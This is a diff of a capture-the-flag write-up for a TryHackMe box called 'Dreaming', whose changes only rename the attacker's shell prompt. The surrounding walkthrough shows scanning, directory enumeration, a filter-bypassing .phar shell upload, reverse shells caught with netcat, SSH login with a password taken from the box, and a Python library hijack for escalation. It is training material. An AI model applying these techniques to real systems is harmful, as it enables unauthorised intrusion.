@@ -15,7 +15,7 @@ Can you help Sandman restore his kingdom?
 We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
 └─$ rustscan -a dreaming.thm -- -A  
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -28,7 +28,7 @@ ________________________________________
  --------------------------------------
 🌍HACK THE PLANET🌍
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.8.38:22
@@ -54,7 +54,7 @@ PORT   STATE SERVICE REASON         VERSION
 We can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) tu start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
 └─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://dreaming.thm
 
 /app                  (Status: 301) [Size: 310] [--> http://dreaming.thm/app/]
@@ -97,7 +97,7 @@ We can upload a .phar shell and it will bypass both of the security filters (rea
 Set up a listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and open the file on the [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
 └─$ nc -lvnp 1337
 listening on [any] 1337 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.8.38] 33634
@@ -121,7 +121,7 @@ export TERM=xterm
 www-data@ip-10-10-8-38:/$ ^Z
 zsh: suspended  nc -lvnp 1337
                                                                                                                               
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
 └─$ stty raw -echo;fg
 [1]  + continued  nc -lvnp 1337
                                reset
@@ -146,7 +146,7 @@ password = "HeyLucien#@1999!"
 Let's try it on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) with username `lucien` :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Dreaming]
 └─$ ssh lucien@dreaming.thm 
 
 lucien@ip-10-10-8-38:~$ cat lucien_flag.txt 
@@ -288,7 +288,7 @@ mysql> select * from dreams;
 We setup a listener with [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and try to execute getDreams.py again :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ nc -lvnp 1337
 listening on [any] 1337 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.83.170] 44354
@@ -312,7 +312,7 @@ Now we have to modify the `shutil` lib of [Python](../../3%20-%20Tags/Programmin
 Wait morpheus to launch restore.py & got the [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) :
 
 ```bash
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.8.162.183] from (UNKNOWN) [10.10.83.170] 47820
